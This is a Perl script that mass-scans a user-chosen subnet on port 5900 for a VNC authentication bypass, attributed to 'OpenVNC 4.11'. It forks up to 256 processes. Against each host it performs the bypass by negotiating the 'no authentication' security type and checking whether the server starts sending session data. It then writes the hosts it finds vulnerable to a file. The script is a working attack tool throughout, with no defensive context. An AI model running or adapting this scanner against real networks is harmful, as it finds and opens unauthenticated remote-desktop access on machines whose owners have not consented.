#!/usr/bin/perl
# Multi-threaded scan for OpenVNC 4.11 authentication bypass.


use strict;  # why not?
use warnings;
use IO::Socket;
use threads;
use threads::shared;
use Errno qw(EAGAIN);

# Configuration variables
use constant VNC_PORT => 5900;
my $splits = 5; # Creates 2^N processes.
my $avg_time = 5; # Tweak this to get better time estimates.
our $subnet;

our @results : shared;
our $todo = 0;
my $orig_thread = "yes";
my $start;
my $end;
my $time_estimate;
my $elapsed = time;
my $out_file;

++$|; # To watch as the results come in, in real time.
$subnet = $ARGV[0] || ""; # Get subnet from command line, else ask for it.

while (1) {
    last if $subnet =~ m/^\d{1,3}\.\d{1,3}\.\d{1,3}\.?\*?/;
    print "\nWhat subnet do you want to scan? ";
    chomp($subnet = <STDIN>);
    print "That does not look right. Enter something like 192.168.1.*\n\n";
}

# Put the subnet in the form x.y.z. so we can just concatenate the hostnum.
$subnet =~ s/^(\d{1,3}\.\d{1,3}\.\d{1,3}).*/$1/;
$subnet .= ".";

$out_file = "VNC_" . $subnet . "txt";

# Mostly a guesstimate
$time_estimate = $avg_time * (256 / (2**$splits));
$time_estimate = int ($time_estimate / 60);
$time_estimate += 4;

print "\nScanning subnet ${subnet}x -- this should take approximately
$time_estimate minute(s).\n";
print "[!] = Vulnerable, [*] = Safe, [.] = No response.\n\n";

CHECK: {
    unless ($splits >= 0 && $splits <= 8) {
        die "ERROR: Do not split $splits times--that makes no sense.\n";
    }

    unless ($splits <= 5) {
        warn "Reduce the number of splits from $splits to 5 or less if you
        get memory errors.\n\n";
    }
}

# Ugly, but this works.
DivideWork() if $splits >= 1;
DivideWork() if $splits >= 2;
DivideWork() if $splits >= 3;
DivideWork() if $splits >= 4;
DivideWork() if $splits >= 5;
DivideWork() if $splits >= 6;
DivideWork() if $splits >= 7;
DivideWork() if $splits >= 8;

# Which IPs this thread scans.
$start = $todo << (8 - $splits);
$end = $start + (256 / (2**$splits)) - 1;

foreach ($start .. $end) {
    Scan_VNC($_);
}

wait until $?; # Wait for children to finish.
exit unless $orig_thread eq "yes";

# Only the original parent thread will continue.

$elapsed = time - $elapsed;
$elapsed /= 60;
$elapsed = int $elapsed;

print "\n\nFinished scanning ${subnet}x in $elapsed minute(s).\n";

SaveData();

exit;

####################################

sub DivideWork {
    my $pid;

    FORK: {
        $todo *= 2;
        if ($pid = fork) {
            # Parent
            ++$todo;

        } elsif (defined $pid) {
            # Child
            $orig_thread = "no";

        } elsif ($! == EAGAIN) {
            # Recoverable forking error.
            sleep 7;
            redo FORK;

        } else {
            # Unable to fork.
            die "Unable to fork: $!\n";

        }
    }
}


sub SaveData {
    my $vulns = 0;
    open(FOUND, ">", $out_file) or die "Cannot open $out_file -- $!";

    foreach my $IP (1..254) {
        my $record;
        $record = $results[$IP];

        unless ($record =~ m/not vulnerable/io) {
            ++$vulns;
            print FOUND $record;
        }
    }

    print FOUND "\nVulnerabilites found: $vulns";
    close(FOUND) or die "Cannot close $out_file -- $!";

    print "Data saved to ${out_file}\n\n";
}

sub Scan_VNC {
    # Scan for OpenVNC 4.11 authentication bypass.

    my $hostnum = shift;
    my $host = $subnet . $hostnum;
    my $sock;
    my $proto_ver;
    my $ignored;
    my $auth_type;
    my $sec_types;
    my $vnc_data;

    $host or die("ERROR: no host passed to Scan_VNC.\n");

    # The host numbers .0 and .255 are reserved; ignore them.
    if ($hostnum <= 0 or $hostnum >= 255) { return; }

    # Format things nicely--that crazy formula just adds spaces.
    $results[$hostnum] = "$host";
    $results[$hostnum] .= (" " x (4 - int(log($hostnum)/log(10)))) . " = ";

    unless ($sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => VNC_PORT, Proto => 'tcp',)) {
        $results[$hostnum] .= "Not vulnerable, no response.\n";
        print ".";
        return;
    }

    # Negotiate protocol version.
    $sock->read($proto_ver, 12);
    print $sock $proto_ver;

    # Get supported security types and ignore them.
    $sock->read($sec_types, 1);
    $sock->read($ignored, unpack('C', $sec_types));

    # Claim that we only support no authentication.
    print $sock "\x01";

    # We should get "0000" back, indicating that they won't fall back to no authentication.
    $sock->read($auth_type, 4);
    if (unpack('I', $auth_type)) {
        $results[$hostnum] .= "Not vulnerable, refused to support
        authentication type.\n";
        print "*";
        close($sock);
        return;
    }

    # Client initialize.
    print $sock "\x01";

    # If the server starts sending data, we're in.
    $sock->read($vnc_data, 4);

    if (unpack('I', $vnc_data)) {
        $results[$hostnum] .= "VULNERABLE! $proto_ver\n";
        print "!";
    } else {
        $results[$hostnum] .= "Not vulnerable, did not send data.\n";
        print "*";
    }

    close($sock);
    return;
} 